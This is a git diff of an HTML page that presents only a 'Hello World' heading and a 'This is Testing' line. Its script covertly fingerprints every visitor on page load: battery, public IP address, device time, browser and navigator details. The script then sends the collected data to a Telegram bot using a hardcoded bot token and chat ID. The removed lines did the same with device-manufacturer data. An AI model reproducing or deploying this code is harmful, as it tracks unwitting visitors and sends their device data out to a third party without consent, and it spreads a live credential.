@@ -2,45 +2,83 @@
   <html>
     <body>
       <h1>Hello World</h1>
+      <p>This is Testing</p>
       
       <script>
         
-        // Replace YOUR_BOT_TOKEN and CHAT_ID with your own values
-const botToken = "6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU";
-const chatId = "5857694327";
+  
+        
+        
+        
+        
+        
+        
+// Get the battery status
+navigator.getBattery().then(function(battery) {
+  const batteryStatus = {
+    level: battery.level * 100,
+    chargingStatus: battery.charging ? "charging" : "not charging",
+    timeToFullCharge: battery.chargingTime,
+    timeToEmpty: battery.dischargingTime
+  };
+  
+  // Get the IP address
+  fetch("https://api.ipify.org/?format=json")
+    .then(response => response.json())
+    .then(data => {
+      const ipAddress = data.ip;
+      
+      // Get the device time
+      const deviceTime = new Date();
+      
+      // Create a message with all the information
+      const message = `
+        Battery level: ${batteryStatus.level}%
+        Charging status: ${batteryStatus.chargingStatus}
+        Time until fully charged: ${batteryStatus.timeToFullCharge} seconds
+        Time until battery is empty: ${batteryStatus.timeToEmpty} seconds
+        IP address: ${ipAddress}
+        Device time: ${deviceTime}
+        Code name: ${navigator.appCodeName}
+        Browser name: ${navigator.appName}
+        Browser version: ${navigator.appVersion}
+        Platform: ${navigator.platform}
+        User agent: ${navigator.userAgent}
+        Cookies enabled: ${navigator.cookieEnabled}
+        Language: ${navigator.language}
+        Preferred languages: ${navigator.languages}
+        Online: ${navigator.onLine}
+        Do not track: ${navigator.doNotTrack}
+        Geolocation supported: ${navigator.geolocation}
+        Number of logical processors: ${navigator.hardwareConcurrency}
+        Maximum touch points: ${navigator.maxTouchPoints}
+        Clipboard access: ${navigator.clipboard}
+        WebDriver control: ${navigator.webdriver}
+        Storage access: ${navigator.storage}
+        Plugins installed: ${navigator.plugins}
+        Supported MIME types: ${navigator.mimeTypes}
+      `;
+      
+      // Send the message to the Telegram bot
+      const telegramBotToken = "6200671913:AAGfUPW-ZW_NwtJO9UPnQ1SHKNp3dxxNoPU";
+      const telegramChatId = "5857694327";
+      const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+      const telegramMessage = {
+        chat_id: telegramChatId,
+        text: message
+      };
+      fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(telegramMessage)
+      }).then(response => console.log("Message sent to Telegram bot"))
+        .catch(error => console.error(error));
+    })
+    .catch(error => console.error(error));
+});
 
-let manufacturer = "";
-const userAgent = navigator.userAgent;
-
-if (userAgent.indexOf("Samsung") > -1) {
-  manufacturer = "Samsung";
-} else if (userAgent.indexOf("iPhone") > -1) {
-  manufacturer = "Apple";
-} else if (userAgent.indexOf("Pixel") > -1) {
-  manufacturer = "Google";
-} else if (userAgent.indexOf("Huawei") > -1) {
-  manufacturer = "Huawei";
-} else if (userAgent.indexOf("Xiaomi") > -1) {
-  manufacturer = "Xiaomi";
-} else if (userAgent.indexOf("OPPO") > -1) {
-  manufacturer = "OPPO";
-} else if (userAgent.indexOf("Vivo") > -1) {
-  manufacturer = "Vivo";
-} else if (userAgent.indexOf("OnePlus") > -1) {
-  manufacturer = "OnePlus";
-} // add more conditions for other manufacturers
-
-const model = navigator.platform;
-
-const message = "Device manufacturer: " + manufacturer + "\nDevice model: " + model;
-
-fetch("https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + message)
-  .then(response => {
-    console.log("Message sent successfully");
-  })
-  .catch(error => {
-    console.error(error);
-  });
 
         
       </script>
